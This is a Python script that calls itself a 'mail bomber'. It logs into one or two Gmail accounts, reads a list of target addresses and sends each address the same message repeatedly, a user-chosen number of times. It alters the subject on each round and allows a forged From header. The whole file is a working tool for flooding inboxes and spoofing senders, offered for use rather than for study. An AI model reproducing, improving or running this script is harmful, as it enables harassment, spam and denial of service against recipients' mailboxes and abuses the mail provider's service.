import smtplib, ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import sys


# Some show...
print(' ')
print("MAIL BOMBER BY V01DS!!! USE IT WISELY!!!")
print(' ')

# Setting up default things
port = 587  # For starttls
smtp_server = "smtp.gmail.com"

# Taking the inputs from the user
html_ask = input("Do you want to use html? y/n: ")
print(' ')

if html_ask == 'y':
    html_path =  input("Enter the html code input: ")
    print(' ')
    text = input("Enter the plain-text: ")
    print(' ')
    
    html_read = open(html_path, "r")
    html = html_read.read()
    html_read.close



if html_ask != 'y':
    message = input("Type your message you want to send: ")
    print(' ')

subject = input("Type the subject: ")
print(' ')

sender_mail = input("Type your mail and press enter: ")
print(' ')

sender_pass = input("Type your password and press enter: ")
print(' ')

sender_mail2 = input("Type your second mail and press enter, don't type anything if you don't use a second mail: ")   
print(' ')

sender_pass2 = input("Type your second mails password and press enter: ")
print(' ')

from_mail = input("From who do you want to send this mail?: ")
print(' ')

mail_path = input("Enter the mail list path: ")
good_path = open(mail_path, 'r')
print(' ')

bomb_ask = input("Do you want to bomb these mails with multiple messages? (y/n)")
if bomb_ask == 'y':
    bomb_times = int(input("How many times do you want to send your mails for each address in the list?: "))
    if sender_mail2 != '':
        if int(bomb_times) == 1:
            bomb_times = bomb_times
        if int(bomb_times) % 2 == 1:
            bomb_times = (bomb_times + 1) / 2    
        else:
            bomb_times = bomb_times / 2
else:
    bomb_times = 1
print(' ')


# Sending the mails 
def sendFirst():

    try:
        if html_ask == 'y':
            mail = MIMEMultipart("alternative")
            mail["From"] = from_mail
            mail["Subject"] = subject
            mail['To'] = reciever
        
            part1 = MIMEText(text, "plain")
            part2 = MIMEText(html, "html")
            mail.attach(part1)
            mail.attach(part2)
            
            server = smtplib.SMTP('smtp.gmail.com:587') 
            server.ehlo()
            server.starttls()
            server.login(sender_mail, sender_pass)
            server.sendmail(sender_mail, reciever, mail.as_string())
            print('Mail sent from the first account to ' + str(reciever))
    
        elif html_ask != 'y':
            mail = MIMEText(message, "html", "utf-8")
            mail["From"] = from_mail
            mail["Subject"] = subject
            mail['To'] = reciever
            mail = mail.as_string()
            
            server = smtplib.SMTP('smtp.gmail.com:587') 
            server.starttls() 
            server.login(sender_mail, sender_pass)   
            server.sendmail(sender_mail, reciever, mail) 
            print('Mail sent from the first account to ' + str(reciever))
          
    except KeyboardInterrupt:
        print("An error has occured")
        
def sendSecond():
    try:
        if html_ask == 'y':
            mail2 = MIMEMultipart("alternative")
            mail2["From"] = from_mail
            mail2["Subject"] = subject
            mail2['To'] = reciever
        
            part1 = MIMEText(text, "plain")
            part2 = MIMEText(html, "html")
            mail2.attach(part1)
            mail2.attach(part2)
            
            server = smtplib.SMTP('smtp.gmail.com:587') 
            server.ehlo()
            server.starttls()
            server.login(sender_mail2, sender_pass2)
            server.sendmail(sender_mail2, reciever, mail2.as_string())
            print('Mail sent from the second account to ' + str(reciever))
            
        elif html_ask != 'y':

            mail2 = MIMEText(message, "html", "utf-8")
            mail2["From"] = from_mail
            mail2["Subject"] = subject
            mail2['To'] = reciever
            mail2 = mail2.as_string()
    
            server = smtplib.SMTP('smtp.gmail.com:587') 
            server.starttls() 
            server.login(sender_mail2, sender_pass2)   
            server.sendmail(sender_mail2, reciever, mail2) 
            print('Mail sent from the second account to ' + str(reciever))
         
    except KeyboardInterrupt:
        print("An error has occured")


while True:
    
    if sender_mail2 == '': 
        email = good_path.readline().replace('\n','')
        bacot = email.strip().split(':')
        reciever = str(bacot[0])
        if not email:
            break
        for i in range(bomb_times):
                if bomb_times == 1:
                    sendFirst()
                else:
                    sendFirst()
                    subject = subject + str(1)

    
    else:    
        email = good_path.readline().replace('\n','')
        bacot = email.strip().split(':')
        reciever = str(bacot[0])
        if not email:
            break
        for i in range(int(bomb_times)):
            if bomb_times == 1:
                sendFirst()
                sendSecond()
            else:
                sendFirst()
                sendSecond()
                subject = subject + str(1)
            
            
